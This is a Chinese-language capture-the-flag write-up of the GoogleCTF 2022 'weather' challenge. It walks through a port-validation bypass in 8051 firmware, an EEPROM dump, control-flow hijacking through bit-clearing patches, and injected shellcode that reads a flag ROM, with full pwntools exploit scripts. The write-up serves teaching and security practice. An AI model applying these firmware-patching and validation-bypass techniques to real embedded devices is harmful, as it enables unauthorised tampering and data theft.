本文是GoogleCTF2022 weather这道题的解题思路。题目提供了datasheet和firmware.c源码，按题意是需要读取8051片内ROM里的flag。  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c9c43ef14482d3ec53b3b5f6ec554db27418e0f1.png)

硬件架构
----

先来看看原理图，主要有下列部件：  
1.一块带256bytes片内ROM的8051芯片  
2.I2C总线上连了5个传感器，分别是湿度、光线（2个）、气压、温度传感器  
3.I2C总线上还连了一个EEPROM，用作运行时的内存  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-341d593a3bf3fd9f8c5a320137015997a0b8e0af.png)

传感器的port和数据格式  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656930093941-1656930093943.png)

源码审计
----

nc上题目环境，随意输入几个命令都是无效的，需要审一下firmware.c  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-90a4386d535fc5cd5dc172bb85446d7d7f306e85.png)

定义了ROM、串口、I2C等的特殊功能寄存器地址

```python
// Secret ROM controller.
__sfr __at(0xee) FLAGROM_ADDR;
__sfr __at(0xef) FLAGROM_DATA;

// Serial controller.
__sfr __at(0xf2) SERIAL_OUT_DATA;
__sfr __at(0xf3) SERIAL_OUT_READY;
__sfr __at(0xfa) SERIAL_IN_DATA;
__sfr __at(0xfb) SERIAL_IN_READY;

// I2C DMA controller.
__sfr __at(0xe1) I2C_STATUS;
__sfr __at(0xe2) I2C_BUFFER_XRAM_LOW;
__sfr __at(0xe3) I2C_BUFFER_XRAM_HIGH;
__sfr __at(0xe4) I2C_BUFFER_SIZE;
__sfr __at(0xe6) I2C_ADDRESS;  // 7-bit address
__sfr __at(0xe7) I2C_READ_WRITE;

// Power controller.
__sfr __at(0xff) POWEROFF;
__sfr __at(0xfe) POWERSAVE;
```

main函数，通过串口接收read、write命令，可对port进行读写

```python
#define CMD_BUF_SZ 384
#define I2C_BUF_SZ 128
int main(void) {
  serial_print("Weather Station\n");

  static __xdata char cmd[CMD_BUF_SZ];
  static __xdata uint8_t i2c_buf[I2C_BUF_SZ];

  while (true) {
    serial_print("? ");

    int i;
    for (i = 0; i &lt; CMD_BUF_SZ; i++) {
      char ch = serial_read_char();
      if (ch == '\n') {
        cmd[i] = '\0';
        break;
      }
      cmd[i] = ch;
    }

    if (i == CMD_BUF_SZ) {
      serial_print("-err: command too long, rejected\n");
      continue;
    }

    struct tokenizer_st t;
    tokenizer_init(&amp;t, cmd);

    char *p = tokenizer_next(&amp;t);
    if (p == NULL) {
      serial_print("-err: command format incorrect\n");
      continue;
    }

    bool write;
    if (*p == 'r') {
      write = false;
    } else if (*p == 'w') {
      write = true;
    } else {
      serial_print("-err: unknown command\n");
      continue;
    }

    p = tokenizer_next(&amp;t);
    if (p == NULL) {
      serial_print("-err: command format incorrect\n");
      continue;
    }

    int8_t port = port_to_int8(p);
    if (port == -1) {
      serial_print("-err: port invalid or not allowed\n");
      continue;
    }

    p = tokenizer_next(&amp;t);
    if (p == NULL) {
      serial_print("-err: command format incorrect\n");
      continue;
    }

    uint8_t req_len = str_to_uint8(p);
    if (req_len == 0 || req_len &gt; I2C_BUF_SZ) {
      serial_print("-err: I2C request length incorrect\n");
      continue;
    }

    if (write) {
      for (uint8_t i = 0; i &lt; req_len; i++) {
        p = tokenizer_next(&amp;t);
        if (p == NULL) {
          break;
        }

        i2c_buf[i] = str_to_uint8(p);
      }

      int8_t ret = i2c_write(port, req_len, i2c_buf);
      serial_print(i2c_status_to_error(ret));
    } else {
      int8_t ret = i2c_read(port, req_len, i2c_buf);
      serial_print(i2c_status_to_error(ret));

      for (uint8_t i = 0; i &lt; req_len; i++) {
        char num[4];
        uint8_to_str(num, i2c_buf[i]);
        serial_print(num);

        if ((i + 1) % 16 == 0 &amp;&amp; i +1 != req_len) {
          serial_print("\n");
        } else {
          serial_print(" ");
        }
      }

      serial_print("\n-end\n");
    }
  }

  // Should never reach this place.
}
```

读操作，`r [allowded port] [length]`  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cb9d5a5767debac9d4e0e24dc2a27c76a97940fd.png)

写操作，`w [allowed port] [length] [int8] [int8] [int8]...`，但传感器不允许写  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-6b81bc5eefd5dcb43c4dacd1c0648e4d8dbc843b.png)

这里只能读写指定的5个传感器的port，读以外的port会被认定为`-err: port invalid or not allowed`。这里存在两个问题：  
1.`is_port_allowed`只会比较port的前三个字节是否相同  
2.`str_to_uint8`这个过程是`mod 256`的  
结合两点就有一个port任意读写的洞，即`101120+p等同于p号端口`

```python
const char *ALLOWED_I2C[] = {
  "101",  // Thermometers (4x).
  "108",  // Atmospheric pressure sensor.
  "110",  // Light sensor A.
  "111",  // Light sensor B.
  "119",  // Humidity sensor.
  NULL
};

uint8_t str_to_uint8(const char *s) {
  uint8_t v = 0;
  while (*s) {
    uint8_t digit = *s++ - '0';
    if (digit &gt;= 10) {
      return 0;
    }
    v = v * 10 + digit;
  }
  return v;
}

bool is_port_allowed(const char *port) {
  for(const char **allowed = ALLOWED_I2C; *allowed; allowed++) {
    const char *pa = *allowed;
    const char *pb = port;
    bool allowed = true;
    while (*pa &amp;&amp; *pb) {
      if (*pa++ != *pb++) {
        allowed = false;
        break;
      }
    }
    if (allowed &amp;&amp; *pa == '\0') {
      return true;
    }
  }
  return false;
}

int8_t port_to_int8(char *port) {
  if (!is_port_allowed(port)) {
    return -1;
  }

  return (int8_t)str_to_uint8(port);
}
```

端口任意读写
------

7bit的i2c地址，只需从`101120+0`到`101120+127`读一遍即可  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-017259ffc5e4ad4ea92436215252c5430bab7c2f.png)

发现只有33、101、108、110、111、119端口存在，而且除33号端口以外都是传感器，因此可断定33号为EEPROM端口

```php
&lt;33&gt;
r 101153 16
 i2c status: transaction completed / ready
2 0 6 2 4 228 117 129 48 18 8 134 229 130 96 3 
-end
?&lt;101&gt;
r 101221 16
 i2c status: transaction completed / ready
22 22 21 35 0 0 0 0 0 0 0 0 0 0 0 0 
-end
?&lt;108&gt;
r 101228 16
 i2c status: transaction completed / ready
3 249 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
-end
?&lt;110&gt;
r 101230 16
 i2c status: transaction completed / ready
78 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
-end
?&lt;111&gt;
r 101231 16
 i2c status: transaction completed / ready
81 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
-end
?&lt;119&gt;
r 101239 16
 i2c status: transaction completed / ready
37 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
-end
```

读取EEPROM
--------

读33端口，发现仅有64bytes的数据  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ddf36368145ac55c8789fedabc5ff117a209a4b8.png)

datasheet提到EEPROM 4种不同的内存组织形式，按原理图应是用的CTF-55930D，也就是33号端口的EEPROM有64页，每页有64字节  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656931838216-1656931838218.png)  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2b1f8c2753ef83abd0be2a471ad41087a5f096e9.png)

同时，datasheet给出了切换页的方法，通过写入pageIndex以及`0xa5 0x5a 0xa5 0x5a`这4字节。如需要切换至第3页，写入命令为`w 101153 5 3 165 90 165 90`  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8a34477132b9684e6f8d6deea41d05dbf99362b7.png)  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656932215987-1656932215989.png)

通过此方法，可以将整个EEPROM都dump下来

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

HOST = 'weather.2022.ctfcompetition.com'
PORT = 1337

tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

p = remote(HOST, PORT)

def pwn():
    info("pwnit!")

    f = open('dump', 'wb')

    for i in range(64):
        print(str(i))
        p.sla('? ', 'w 101153 5 '+ str(i) +' 165 90 165 90')
        p.sla('? ', 'r 101153 64')

        p.ru('ready\n')

        for j in range(4):
            bys = []
            for k in range(15):
                byte = int(p.ru(' ').strip(' '))
                bys.append(byte)
            byte = int(p.ru('\n').strip('\n'))
            bys.append(byte)
            arr = bytearray(bys)
            b_arr = bytes(arr)
            f.write(b_arr)

    f.close()
    p.irt()

if __name__ == "__main__":
    pwn()
```

dump下来以后，可以初步判定是8051的固件  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656932495113-1656932495116.png)

8051固件逆向
--------

通过字符串、查找立即数`0x8c7`定位到`serial_print`函数代码  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656932681258-1656932681259.png)

从`0x10e`到`0x114`这块便是输出`i2c status: error - device not found`的代码  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-15a5fbf3e30ce7a9403c745a2cbb50862ec3cc5d.png)

先测试一下，改动EEPROM内的数据是否能影响到运行着的程序。datasheet中给出了通过clearmask方式向EEPROM写入数据的方法，即可以将EEPROM某1bit的数据从1置0，但不能反过来0置1。如`0xc7`可以改为`0xc0`，但不能改为`0xb5`

```php
&gt;&gt;&gt; bin(0xc7)
'0b11000111'
&gt;&gt;&gt; bin(0xc0)
'0b11000000'
&gt;&gt;&gt; bin(0xb5)
'0b10110101'
```

通过设置对应bit的clearmask即可  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e2f0b176af26e7403781029acbae22ae021a5455.png)

当我们读一个不存在的端口，会输出`i2c status: error - device not found`，现修改`0x8C7`为`0x8C0`则会输出`busy`，0x10e位于第4页，而`0xc7`位于第4页第16个字节（第0个字节开始算），在该字节写入`0xf`即可将低4位置0。0到15字节不作修改，都写入0。  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656934387965-1656934387966.png)

劫持控制流
-----

上述结果显示，修改EEPROM的数据会影响到正在运行的固件，只需要在代码必经之处放一条jmp指令跳到shellcode处执行即可。由于，clearmask只能从1置0，需要寻找一处合适的跳转地址。比较幸运，我们找到`0xFA`这个可用地址，ljmp指令需要用到3个字节`\x02`+固件地址。在固件的最后部分有一大片255的数据，就在该区域写入shellcode。  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-38d925eb4e4c7265b7feb18ec3e67cd630d1fed0.png)

将`\x13\xbf\x03`修改为`\x02\x0a\x03`即可劫持控制流跳转到`0xa03`处执行代码  
![title](https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2022/07/04/1656935568695-1656935568696.png)

先在shellcode处部署一段简易代码，如打印出`i2c status: error - device misbehaved`

```php
90 08 ED    mov     DPTR, #0x8ED
75 F0 80    mov     B, #0x80
```

控制流便被劫持到shellcode了，需要注意在shellcode的末尾需要部署一个ljmp跳回到0x114，否则会crash  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-86c25934190b2cc1f0ebcdf86f20118cbddd6a35.png)

```php
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

HOST = 'weather.2022.ctfcompetition.com'
PORT = 1337

gdbscript = '''
'''

tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

p = remote(HOST, PORT)

def pwn():
    info("pwnit!")

    p.sla('? ', 'w 101153 5 3 165 90 165 90')
    p.sla('? ', 'r 101153 64')

    pause()
    p.sla('? ', 'w 101153 65 3 165 90 165 90 '+'0 '*0x39 + '255 17 181')
    #'w 101153 65 3 165 90 165 90 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 17 181'
    #p.sla('? ', 'r 101153 64')

    pause()
    l = [0x90, 0x8, 0xed, 0x75, 0xf0, 0x80, 0x2, 0x1,0x14]

    pl = ''
    for i in range(len(l)):
        pl += ' '
        pl += str(l[i] ^ 255)

    p.sla('? ', 'w 101153 '+str(len(l)+8)+' 40 165 90 165 90 0 0 255'+pl)
    p.sla('? ', 'r 101168 64')

    p.irt()

if __name__ == "__main__":
    pwn()
```

读取FlagROM
---------

datasheet给出了读取方式，将`FLAGROM_ADDR`分别设置`0~255`，然后将`FLAGROM_DATA`传给`SERIAL_OUT_DATA`便可输出flag  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-85c1906d74c6d1ae741f6f83d208c0e9e3d95197.png)

读FlagROM的c代码，用sdcc编译`sdcc -mmcs51 --iram-size 128 --xram-size 0 --code-size 4096  --nooverlay --noinduction --verbose --debug -V --std-sdcc89 --model-small usercode.c`

```c
#include 
#include 

__sfr __at(0xee) FLAGROM_ADDR;
__sfr __at(0xef) FLAGROM_DATA;

/* Serial controller.*/
__sfr __at(0xf2) SERIAL_OUT_DATA;
__sfr __at(0xf3) SERIAL_OUT_READY;
__sfr __at(0xfa) SERIAL_IN_DATA;
__sfr __at(0xfb) SERIAL_IN_READY;

void serial_print(const char *s) {
  while (*s) {
    while (!SERIAL_OUT_READY) {
      /* Busy wait...*/
    }

    SERIAL_OUT_DATA = *s++;
  }
}

int main(void) {
    /*serial_print("Weather Station\n");*/
    FLAGROM_ADDR = 0;

    while(FLAGROM_DATA){
      while (!SERIAL_OUT_READY) {
      /* Busy wait...*/
      }
      SERIAL_OUT_DATA = FLAGROM_DATA;
      FLAGROM_ADDR = FLAGROM_ADDR + 1;
    }

    return 0;
}
```

将main函数的机器码抠出来  
![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-638a4191f392c2f0f480ec13c2d1fb5d5698a322.png)

完整的exp

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

HOST = 'weather.2022.ctfcompetition.com'
PORT = 1337

tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

p = remote(HOST, PORT)

def pwn():
    info("pwnit!")

    p.sla('? ', 'w 101153 5 3 165 90 165 90')
    p.sla('? ', 'r 101153 64')

    pause()
    p.sla('? ', 'w 101153 65 3 165 90 165 90 '+'0 '*0x39 + '255 17 181')
    #'w 101153 65 3 165 90 165 90 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 17 181'
    #p.sla('? ', 'r 101153 64')

    pause()
    #l = [0x90, 0x8, 0xed, 0x75, 0xf0, 0x80, 0x2, 0x1,0x14]
    #l = [0x75,0xee,15, 0xe5,0xef, 0x60,0x09, 0xe5,0xf3, 0x60,0xfc, 0x85,0xef,0xf2, 0x80,0xf3, 0x90, 0, 0, 0x2,0x1,0x14]
    l = [0x75, 0xEE, 0x00, 0xE5, 0xEF, 0x60, 0x0F, 0xE5, 0xF3, 0x60, 0xFC, 0x85, 0xEF, 0xF2, 0xE5, 0xEE, 0xFF, 0x04, 0xF5, 0xEE, 0x80, 0xED, 0x90, 0x00, 0x00, 0x02, 0x1, 0x14]
    pl = ''
    for i in range(len(l)):
        pl += ' '
        pl += str(l[i] ^ 255)

    p.sla('? ', 'w 101153 '+str(len(l)+8)+' 40 165 90 165 90 0 0 255'+pl)
    p.sla('? ', 'r 101168 64')

    p.irt()

if __name__ == "__main__":
    pwn()
```

![title](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d962b8c47c399572f92e4f9dcdf88dd437a03f16.png)